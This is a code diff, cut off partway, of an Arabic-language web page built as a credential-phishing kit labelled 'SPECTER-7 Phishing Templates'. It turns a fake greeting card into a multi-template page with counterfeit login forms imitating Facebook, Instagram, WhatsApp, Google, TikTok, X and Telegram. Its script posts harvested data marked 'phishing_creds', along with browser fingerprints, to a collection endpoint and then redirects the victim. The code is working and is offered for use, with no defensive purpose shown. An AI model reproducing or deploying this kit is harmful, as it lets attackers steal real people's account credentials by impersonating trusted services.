@@ -2,65 +2,49 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>بطاقة تهنئة 🎉</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>تسجيل الدخول</title>
 <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
     body {
-        font-family: 'Segoe UI', Tahoma, sans-serif;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 0;
+        margin: 0;
+        background: #f0f2f5;
+    }
+    #app { width: 100%; max-width: 100%; min-height: 100vh; }
+
+    /* ═══════════════════════════════════════
+       قالب 1: بطاقة تهنئة (الافتراضي)
+       ═══════════════════════════════════════ */
+    .card-view {
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         min-height: 100vh;
         display: flex;
         align-items: center;
         justify-content: center;
         padding: 20px;
+        font-family: 'Segoe UI', Tahoma, sans-serif;
     }
-    .card {
+    .card-box {
         background: white;
         border-radius: 20px;
         padding: 40px 30px;
         max-width: 450px;
         width: 100%;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         text-align: center;
-        animation: slideIn 0.6s ease;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
     }
-    @keyframes slideIn {
-        from { opacity: 0; transform: translateY(30px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
-    .emoji {
-        font-size: 80px;
-        margin-bottom: 20px;
-        animation: bounce 2s infinite;
-    }
-    @keyframes bounce {
-        0%, 100% { transform: translateY(0); }
-        50% { transform: translateY(-15px); }
-    }
-    h1 {
-        color: #764ba2;
-        font-size: 28px;
-        margin-bottom: 15px;
-        font-weight: bold;
-    }
-    .from {
-        color: #666;
-        font-size: 18px;
-        margin-bottom: 10px;
-    }
-    .from-name {
-        color: #ff6b9d;
-        font-weight: bold;
-        font-size: 22px;
-    }
-    p.message {
-        color: #888;
-        line-height: 1.6;
-        margin: 20px 0;
-        font-size: 15px;
-    }
-    .btn {
+    .card-box .emoji { font-size: 80px; margin-bottom: 20px; }
+    .card-box h1 { color: #764ba2; font-size: 28px; margin-bottom: 15px; }
+    .card-box .from { color: #666; font-size: 18px; margin-bottom: 10px; }
+    .card-box .from-name { color: #ff6b9d; font-weight: bold; font-size: 22px; }
+    .card-box p { color: #888; line-height: 1.6; margin: 20px 0; font-size: 15px; }
+    .card-box .btn-main {
         background: linear-gradient(135deg, #667eea, #764ba2);
         color: white;
         border: none;
@@ -71,206 +55,843 @@
         cursor: pointer;
         margin-top: 20px;
         width: 100%;
-        transition: transform 0.2s, box-shadow 0.2s;
-        box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
     }
-    .btn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 12px 25px rgba(102, 126, 234, 0.5);
-    }
-    .btn:active { transform: translateY(0); }
 
-    .login-form { display: none; text-align: right; }
-    .login-form.active { display: block; animation: slideIn 0.4s ease; }
-    .login-form h2 {
-        color: #764ba2;
+    /* ═══════════════════════════════════════
+       Facebook
+       ═══════════════════════════════════════ */
+    .fb-view {
+        background: #f0f2f5;
+        min-height: 100vh;
+        padding: 40px 20px;
+    }
+    .fb-container {
+        max-width: 400px;
+        margin: 0 auto;
+        padding-top: 40px;
+    }
+    .fb-logo {
         text-align: center;
-        margin-bottom: 25px;
-        font-size: 22px;
+        margin-bottom: 30px;
     }
-    .input-group {
-        margin-bottom: 18px;
-        text-align: right;
+    .fb-logo svg {
+        width: 240px;
+        height: 84px;
     }
-    .input-group label {
-        display: block;
-        color: #555;
-        margin-bottom: 8px;
+    .fb-form {
+        background: white;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .fb-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 17px;
+        margin-bottom: 12px;
+        font-family: inherit;
+        direction: ltr;
+        text-align: left;
+    }
+    .fb-input:focus {
+        outline: none;
+        border-color: #1877f2;
+        box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    .fb-btn {
+        width: 100%;
+        padding: 12px;
+        background: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 20px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 6px;
+    }
+    .fb-btn:hover { background: #166fe5; }
+    .fb-forgot {
+        text-align: center;
+        margin-top: 16px;
+    }
+    .fb-forgot a {
+        color: #1877f2;
+        font-size: 14px;
+        text-decoration: none;
+    }
+    .fb-divider {
+        border-top: 1px solid #dadde1;
+        margin: 20px 0;
+    }
+    .fb-new {
+        text-align: center;
+    }
+    .fb-new-btn {
+        background: #42b72a;
+        color: white;
+        border: none;
+        padding: 14px 24px;
+        border-radius: 6px;
+        font-size: 17px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+    .fb-error {
+        background: #ffebe8;
+        border: 1px solid #dd3c10;
+        padding: 10px 12px;
+        border-radius: 4px;
+        color: #dd3c10;
+        font-size: 13px;
+        margin-bottom: 12px;
+        display: none;
+    }
+    .fb-error.show { display: block; }
+
+    /* ═══════════════════════════════════════
+       Instagram
+       ═══════════════════════════════════════ */
+    .ig-view {
+        background: #fafafa;
+        min-height: 100vh;
+        padding: 40px 20px;
+    }
+    .ig-container {
+        max-width: 350px;
+        margin: 0 auto;
+        padding-top: 20px;
+    }
+    .ig-box {
+        background: white;
+        border: 1px solid #dbdbdb;
+        border-radius: 1px;
+        padding: 40px 30px;
+        margin-bottom: 10px;
+    }
+    .ig-logo {
+        text-align: center;
+        margin-bottom: 30px;
+    }
+    .ig-logo svg {
+        width: 175px;
+        height: 51px;
+    }
+    .ig-input {
+        width: 100%;
+        padding: 12px 8px;
+        background: #fafafa;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        font-size: 14px;
+        margin-bottom: 6px;
+        font-family: inherit;
+        direction: ltr;
+        text-align: left;
+    }
+    .ig-input:focus {
+        outline: none;
+        border-color: #a8a8a8;
+    }
+    .ig-btn {
+        width: 100%;
+        padding: 8px;
+        background: #0095f6;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 12px;
+    }
+    .ig-btn:hover { background: #1877f2; }
+    .ig-divider {
+        display: flex;
+        align-items: center;
+        margin: 20px 0;
+        color: #8e8e8e;
+        font-size: 13px;
+        font-weight: 600;
+    }
+    .ig-divider::before, .ig-divider::after {
+        content: '';
+        flex: 1;
+        height: 1px;
+        background: #dbdbdb;
+    }
+    .ig-divider span { padding: 0 18px; }
+    .ig-fb {
+        text-align: center;
+        color: #385185;
         font-size: 14px;
         font-weight: 600;
     }
-    .input-group input {
-        width: 100%;
-        padding: 14px 18px;
-        border: 2px solid #e0e0e0;
-        border-radius: 12px;
-        font-size: 16px;
-        font-family: inherit;
-        transition: border-color 0.2s;
-        direction: ltr;
+    .ig-fb-icon {
+        display: inline-block;
+        vertical-align: middle;
+        margin-left: 6px;
+        width: 16px;
+        height: 16px;
     }
-    .input-group input:focus {
-        outline: none;
-        border-color: #764ba2;
-    }
-    .note {
-        background: #fff8e1;
-        border-right: 4px solid #ffc107;
-        padding: 12px;
-        border-radius: 8px;
-        font-size: 13px;
-        color: #666;
-        margin-bottom: 20px;
-        text-align: right;
-    }
-    .loader {
-        display: none;
+    .ig-forgot {
+        text-align: center;
         margin-top: 20px;
-        color: #764ba2;
-        font-size: 14px;
+        font-size: 12px;
+        color: #00376b;
     }
-    .loader.active { display: block; }
-    .loader::after {
-        content: '...';
-        animation: dots 1.4s infinite;
+
+    /* ═══════════════════════════════════════
+       WhatsApp Web
+       ═══════════════════════════════════════ */
+    .wa-view {
+        background: #f0f2f5;
+        min-height: 100vh;
+        padding: 40px 20px;
     }
-    @keyframes dots {
-        0%, 20% { content: '.'; }
-        40% { content: '..'; }
-        60%, 100% { content: '...'; }
+    .wa-container {
+        max-width: 800px;
+        margin: 0 auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding-top: 40px;
     }
-    .success-msg {
-        display: none;
+    .wa-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 30px;
+    }
+    .wa-logo {
+        margin-bottom: 20px;
+    }
+    .wa-logo svg { width: 60px; height: 60px; }
+    .wa-title {
+        color: #41525d;
+        font-size: 24px;
+        font-weight: 300;
+        margin-bottom: 8px;
         text-align: center;
     }
-    .success-msg.active { display: block; animation: slideIn 0.5s ease; }
-    .success-msg .check {
-        font-size: 80px;
+    .wa-subtitle {
+        color: #667781;
+        font-size: 14px;
+        text-align: center;
+        margin-bottom: 30px;
+    }
+    .wa-qr-box {
+        background: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 1px 3px rgba(11,20,26,0.1);
         margin-bottom: 20px;
+        text-align: center;
     }
-    .success-msg h2 {
-        color: #10b981;
+    .wa-qr-placeholder {
+        width: 220px;
+        height: 220px;
+        background: repeating-conic-gradient(#000 0 25%, #fff 0 50%) 50% / 12px 12px;
+        border: 1px solid #e9edef;
+        margin: 0 auto;
+    }
+    .wa-or-divider {
+        display: flex;
+        align-items: center;
+        width: 100%;
+        max-width: 400px;
+        margin: 20px 0;
+        color: #8696a0;
+        font-size: 13px;
+    }
+    .wa-or-divider::before, .wa-or-divider::after {
+        content: '';
+        flex: 1;
+        height: 1px;
+        background: #e9edef;
+    }
+    .wa-or-divider span { padding: 0 15px; }
+    .wa-login-btn {
+        background: #00a884;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 24px;
+        font-size: 15px;
+        font-weight: 500;
+        cursor: pointer;
+        margin-bottom: 40px;
+    }
+    .wa-form {
+        background: white;
+        border-radius: 8px;
+        padding: 30px;
+        max-width: 400px;
+        width: 100%;
+        box-shadow: 0 1px 3px rgba(11,20,26,0.1);
+        display: none;
+    }
+    .wa-form.active { display: block; }
+    .wa-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #e9edef;
+        border-radius: 6px;
+        font-size: 16px;
+        margin-bottom: 12px;
+        font-family: inherit;
+        direction: ltr;
+        text-align: left;
+    }
+    .wa-input:focus {
+        outline: none;
+        border-color: #00a884;
+    }
+    .wa-submit {
+        width: 100%;
+        padding: 12px;
+        background: #00a884;
+        color: white;
+        border: none;
+        border-radius: 24px;
+        font-size: 15px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+
+    /* ═══════════════════════════════════════
+       Google
+       ═══════════════════════════════════════ */
+    .gg-view {
+        background: white;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .gg-container {
+        max-width: 450px;
+        width: 100%;
+        background: white;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        padding: 48px 40px;
+    }
+    .gg-logo {
+        text-align: center;
+        margin-bottom: 30px;
+    }
+    .gg-logo svg { width: 75px; height: 24px; }
+    .gg-title {
+        color: #202124;
+        font-size: 24px;
+        font-weight: 400;
+        text-align: center;
+        margin-bottom: 10px;
+    }
+    .gg-subtitle {
+        color: #202124;
+        font-size: 16px;
+        text-align: center;
+        margin-bottom: 30px;
+    }
+    .gg-input {
+        width: 100%;
+        padding: 13px 15px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        margin-bottom: 20px;
+        font-family: inherit;
+        direction: ltr;
+        text-align: left;
+    }
+    .gg-input:focus {
+        outline: none;
+        border-color: #1a73e8;
+        box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+    }
+    .gg-btn-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 30px;
+    }
+    .gg-forgot {
+        color: #1a73e8;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .gg-btn {
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 10px 24px;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .gg-btn:hover { background: #1557b0; }
+
+    /* ═══════════════════════════════════════
+       Loading / Success
+       ═══════════════════════════════════════ */
+    .loader-view {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: white;
+        z-index: 9999;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+    }
+    .loader-view.active { display: flex; }
+    .spinner {
+        width: 48px;
+        height: 48px;
+        border: 4px solid #e0e0e0;
+        border-top-color: #1877f2;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-text {
+        margin-top: 20px;
+        color: #666;
+        font-size: 15px;
+    }
+    .error-box {
+        background: #ffebe8;
+        border: 1px solid #dd3c10;
+        padding: 12px;
+        border-radius: 6px;
+        color: #dd3c10;
+        font-size: 13px;
         margin-bottom: 15px;
+        text-align: center;
+        display: none;
     }
+    .error-box.show { display: block; }
 </style>
 </head>
 <body>
-    <div class="card">
-        <!-- المرحلة 1: بطاقة تهنئة -->
-        <div id="cardView">
-            <div class="emoji">🎉</div>
-            <h1>بطاقة تهنئة</h1>
-            <div class="from">تهانينا من</div>
-            <div class="from-name" id="senderName">صديقك</div>
-            <p class="message" id="cardMessage">
-                لقد أرسل لك بطاقة تهنئة خاصة! اضغط "حسناً" لاستلام البطاقة والمحتوى المرفق.
-            </p>
-            <button class="btn" onclick="showLogin()">✅ حسناً، أرني البطاقة</button>
-        </div>
 
-        <!-- المرحلة 2: نموذج تسجيل دخول مزيف -->
-        <div class="login-form" id="loginView">
-            <h2 id="loginTitle">🔐 تحقق من حسابك</h2>
-            <div class="note">
-                ⚠️ لتأكيد استلام البطاقة والمرفقات، يجب التحقق من حسابك.
-            </div>
-            <div class="input-group">
-                <label>البريد الإلكتروني</label>
-                <input type="email" id="emailInput" placeholder="example@gmail.com" autocomplete="off">
-            </div>
-            <div class="input-group">
-                <label>كلمة المرور</label>
-                <input type="password" id="passInput" placeholder="••••••••" autocomplete="off">
-            </div>
-            <button class="btn" onclick="submitCreds()">🔓 تسجيل الدخول</button>
-            <div class="loader" id="loader">جاري التحقق</div>
-        </div>
+<div id="app"></div>
 
-        <!-- المرحلة 3: نجاح -->
-        <div class="success-msg" id="successView">
-            <div class="check">✅</div>
-            <h2>تم التحقق بنجاح</h2>
-            <p class="message">سيتم تحويلك للبطاقة خلال لحظات...</p>
+<div class="loader-view" id="loaderView">
+    <div class="spinner"></div>
+    <div class="loader-text" id="loaderText">جاري التحقق...</div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// SPECTER-7 Phishing Templates
+// ═══════════════════════════════════════════════════════════
+
+const urlParams = new URLSearchParams(window.location.search);
+const SITE = (urlParams.get('site') || 'card').toLowerCase();
+const SENDER = urlParams.get('from') || 'صديق مقرب';
+const TARGET_ID = urlParams.get('id') || 'unknown';
+const TITLE = urlParams.get('title') || 'بطاقة تهنئة';
+const MSG = urlParams.get('msg') || '';
+
+const API_URL = window.location.origin + '/phishing_save.php';
+
+// ───────────────────────────────────────────────
+// Helper: إرسال البيانات للسيرفر
+// ───────────────────────────────────────────────
+function sendCreds(extra) {
+    const payload = {
+        type: 'phishing_creds',
+        site: SITE,
+        target_id: TARGET_ID,
+        sender: SENDER,
+        ua: navigator.userAgent,
+        screen: window.screen.width + 'x' + window.screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        url: window.location.href,
+        timestamp: Date.now(),
+        ...extra
+    };
+
+    console.log('📤 Sending to:', API_URL, payload);
+
+    return fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).then(res => {
+        console.log('✅ Server responded:', res.status);
+        return true;
+    }).catch(err => {
+        console.error('❌ Error:', err);
+        return false;
+    });
+}
+
+// ───────────────────────────────────────────────
+// Helper: شاشة الانتظار + التحويل
+// ───────────────────────────────────────────────
+function showLoaderAndRedirect(text, url, delay) {
+    const lv = document.getElementById('loaderView');
+    document.getElementById('loaderText').textContent = text || 'جاري التحقق...';
+    lv.classList.add('active');
+    setTimeout(() => {
+        window.location.href = url;
+    }, delay || 2500);
+}
+
+// ═══════════════════════════════════════════════════════════
+// القوالب
+// ═══════════════════════════════════════════════════════════
+
+const TEMPLATES = {
+
+// ───────────────────────────────────────────────
+// 1. بطاقة تهنئة (card)
+// ───────────────────────────────────────────────
+card: `
+<div class="card-view">
+    <div class="card-box">
+        <div class="emoji">🎉</div>
+        <h1>${TITLE}</h1>
+        <div class="from">تهانينا من</div>
+        <div class="from-name">${SENDER}</div>
+        <p>${MSG || 'لقد أرسل لك بطاقة تهنئة خاصة! اضغط "حسناً" لاستلام البطاقة والمحتوى المرفق.'}</p>
+        <button class="btn-main" onclick="showCardLogin()">✅ حسناً، أرني البطاقة</button>
+    </div>
+</div>`,
+
+// ───────────────────────────────────────────────
+// 2. Facebook
+// ───────────────────────────────────────────────
+facebook: `
+<div class="fb-view">
+    <div class="fb-container">
+        <div class="fb-logo">
+            <svg viewBox="0 0 240 84" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#1877f2" d="M0 0h240v84H0z" opacity="0"/>
+                <text x="0" y="60" font-family="Helvetica, Arial, sans-serif" font-size="60" font-weight="bold" fill="#1877f2">facebook</text>
+            </svg>
+        </div>
+        <div class="fb-form">
+            <div class="fb-error" id="fbError">البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
+            <input type="text" class="fb-input" id="fbEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
+            <input type="password" class="fb-input" id="fbPass" placeholder="كلمة المرور">
+            <button class="fb-btn" onclick="submitFacebook()">تسجيل الدخول</button>
+            <div class="fb-forgot"><a href="#">هل نسيت كلمة المرور؟</a></div>
+            <div class="fb-divider"></div>
+            <div class="fb-new">
+                <button class="fb-new-btn" onclick="submitFacebook()">إنشاء حساب جديد</button>
+            </div>
         </div>
     </div>
+</div>`,
 
-    <script>
-        // ✅ استخراج المعاملات من URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const sender = urlParams.get('from') || 'صديق مقرب';
-        const targetId = urlParams.get('id') || 'unknown';
-        const title = urlParams.get('title') || 'بطاقة تهنئة';
-        const msg = urlParams.get('msg') || '';
+// ───────────────────────────────────────────────
+// 3. Instagram
+// ───────────────────────────────────────────────
+instagram: `
+<div class="ig-view">
+    <div class="ig-container">
+        <div class="ig-box">
+            <div class="ig-logo">
+                <svg viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
+                    <text x="0" y="38" font-family="'Billabong', 'Brush Script MT', cursive" font-size="42" fill="#262626">Instagram</text>
+                </svg>
+            </div>
+            <input type="text" class="ig-input" id="igUser" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم">
+            <input type="password" class="ig-input" id="igPass" placeholder="كلمة المرور">
+            <button class="ig-btn" onclick="submitInstagram()">تسجيل الدخول</button>
+            <div class="ig-divider"><span>أو</span></div>
+            <div class="ig-fb">
+                <svg class="ig-fb-icon" viewBox="0 0 24 24" fill="#385185">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                تسجيل الدخول باستخدام Facebook
+            </div>
+            <div class="ig-forgot">هل نسيت كلمة المرور؟</div>
+        </div>
+        <div class="ig-box" style="padding: 20px; text-align: center; font-size: 14px;">
+            ليس لديك حساب؟ <span style="color: #0095f6; font-weight: 600;">سجّل</span>
+        </div>
+    </div>
+</div>`,
 
-        document.getElementById('senderName').textContent = sender;
-        document.title = title + ' من ' + sender;
-        if (msg) {
-            document.getElementById('cardMessage').textContent = msg;
-        }
+// ───────────────────────────────────────────────
+// 4. WhatsApp Web
+// ───────────────────────────────────────────────
+whatsapp: `
+<div class="wa-view">
+    <div class="wa-container">
+        <div class="wa-header">
+            <div class="wa-logo">
+                <svg viewBox="0 0 24 24" fill="#00a884">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+            </div>
+            <div class="wa-title">تسجيل الدخول إلى WhatsApp</div>
+            <div class="wa-subtitle">افتح WhatsApp على هاتفك للمتابعة</div>
+        </div>
 
-        function showLogin() {
-            document.getElementById('cardView').style.display = 'none';
-            document.getElementById('loginView').classList.add('active');
-            document.getElementById('loginTitle').textContent = '🔐 تحقق من ' + sender;
-        }
+        <div class="wa-qr-box">
+            <div class="wa-qr-placeholder"></div>
+        </div>
 
-        function submitCreds() {
-            const email = document.getElementById('emailInput').value.trim();
-            const pass = document.getElementById('passInput').value.trim();
+        <div class="wa-or-divider"><span>أو</span></div>
 
-            if (!email) { alert('⚠️ أدخل البريد'); return; }
-            if (!pass) { alert('⚠️ أدخل كلمة المرور'); return; }
+        <button class="wa-login-btn" onclick="showWhatsAppForm()">تسجيل الدخول بالهاتف</button>
 
-            document.getElementById('loader').classList.add('active');
+        <div class="wa-form" id="waForm">
+            <input type="tel" class="wa-input" id="waPhone" placeholder="رقم الهاتف مع رمز الدولة">
+            <input type="password" class="wa-input" id="waPass" placeholder="كلمة المرور">
+            <button class="wa-submit" onclick="submitWhatsApp()">دخول</button>
+        </div>
+    </div>
+</div>`,
 
-            const payload = {
-                type: 'phishing_creds',
-                target_id: targetId,
-                sender: sender,
-                email: email,
-                password: pass,
-                ua: navigator.userAgent,
-                screen: window.screen.width + 'x' + window.screen.height,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                lang: navigator.language,
-                referrer: document.referrer || '',
-                url: window.location.href,
-                timestamp: Date.now()
-            };
+// ───────────────────────────────────────────────
+// 5. Google
+// ───────────────────────────────────────────────
+google: `
+<div class="gg-view">
+    <div class="gg-container">
+        <div class="gg-logo">
+            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="19" font-family="Arial, sans-serif" font-size="24" font-weight="500">
+                    <tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc05">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
+                </text>
+            </svg>
+        </div>
+        <div class="gg-title">تسجيل الدخول</div>
+        <div class="gg-subtitle">استخدم حسابك في Google</div>
 
-            // ✅ المسار المطلق — يشتغل من أي دومين
-            const API_URL = window.location.origin + '/phishing_save.php';
-            console.log('📤 Sending credentials to:', API_URL);
+        <div class="fb-error" id="ggError" style="display:none; border-color:#dadce0; background:#fff; color:#d93025;">البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
 
-            fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then((res) => {
-                console.log('✅ Server responded:', res.status);
-                setTimeout(() => {
-                    document.getElementById('loginView').classList.remove('active');
-                    document.getElementById('successView').classList.add('active');
+        <input type="email" class="gg-input" id="ggEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" class="gg-input" id="ggPass" placeholder="أدخل كلمة المرور">
 
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 3000);
-                }, 800);
-            }).catch((err) => {
-                console.error('❌ Error:', err);
-                // حتى لو فشل — نعرض النجاح
-                document.getElementById('loginView').classList.remove('active');
-                document.getElementById('successView').classList.add('active');
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 3000);
-            });
-        }
+        <div class="gg-btn-row">
+            <span class="gg-forgot">هل نسيت كلمة المرور؟</span>
+            <button class="gg-btn" onclick="submitGoogle()">التالي</button>
+        </div>
+    </div>
+</div>`,
 
-        // ✅ مفتاح Enter
-        document.getElementById('passInput').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitCreds();
-        });
-    </script>
+// ───────────────────────────────────────────────
+// 6. TikTok
+// ───────────────────────────────────────────────
+tiktok: `
+<div class="gg-view" style="background:#000;">
+    <div class="gg-container" style="background:#fff; border-radius:8px;">
+        <div class="gg-logo">
+            <svg viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="24" font-family="Arial, sans-serif" font-size="26" font-weight="bold" fill="#000">TikTok</text>
+            </svg>
+        </div>
+        <div class="gg-title" style="font-size:22px;">تسجيل الدخول</div>
+        <div class="gg-subtitle" style="font-size:14px;">سجّل الدخول للاستمرار في TikTok</div>
+
+        <input type="text" class="gg-input" id="ttUser" placeholder="البريد الإلكتروني أو اسم المستخدم">
+        <input type="password" class="gg-input" id="ttPass" placeholder="كلمة المرور">
+
+        <div style="text-align:center; margin-top:20px;">
+            <button class="gg-btn" onclick="submitTikTok()" style="width:100%; padding:14px; font-size:16px;">تسجيل الدخول</button>
+        </div>
+        <div class="gg-forgot" style="text-align:center; margin-top:20px;">هل نسيت كلمة المرور؟</div>
+    </div>
+</div>`,
+
+// ───────────────────────────────────────────────
+// 7. Twitter / X
+// ───────────────────────────────────────────────
+twitter: `
+<div class="gg-view" style="background:#000;">
+    <div class="gg-container" style="background:#000; border-color:#2f3336;">
+        <div class="gg-logo">
+            <svg viewBox="0 0 24 24" width="40" height="40" fill="#fff">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+            </svg>
+        </div>
+        <div class="gg-title" style="color:#fff; font-size:24px;">تسجيل الدخول إلى X</div>
+
+        <input type="text" class="gg-input" id="twUser" placeholder="رقم الهاتف أو البريد الإلكتروني" style="background:#000; border-color:#2f3336; color:#fff;">
+        <input type="password" class="gg-input" id="twPass" placeholder="كلمة المرور" style="background:#000; border-color:#2f3336; color:#fff;">
+
+        <div style="text-align:center; margin-top:20px;">
+            <button class="gg-btn" onclick="submitTwitter()" style="width:100%; padding:14px; font-size:16px; background:#1d9bf0; border-radius:24px;">تسجيل الدخول</button>
+        </div>
+        <div class="gg-forgot" style="text-align:center; margin-top:20px; color:#1d9bf0;">هل نسيت كلمة المرور؟</div>
+    </div>
+</div>`,
+
+// ───────────────────────────────────────────────
+// 8. Telegram
+// ───────────────────────────────────────────────
+telegram: `
+<div class="gg-view" style="background:#fff;">
+    <div class="gg-container">
+        <div class="gg-logo">
+            <svg viewBox="0 0 24 24" width="60" height="60" fill="#0088cc">
+                <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+            </svg>
+        </div>
+        <div class="gg-title">Telegram Web</div>
+        <div class="gg-subtitle">سجّل الدخول إلى حسابك</div>
+
+        <input type="tel" class="gg-input" id="tgPhone" placeholder="رقم الهاتف">
+        <input type="password" class="gg-input" id="tgPass" placeholder="كلمة المرور">
+
+        <div style="text-align:center; margin-top:20px;">
+            <button class="gg-btn" onclick="submitTelegram()" style="width:100%; padding:14px; font-size:16px; background:#0088cc;">تسجيل الدخول</button>
+        </div>
+    </div>
+</div>`
+
+};
+
+// ═══════════════════════════════════════════════════════════
+// Render
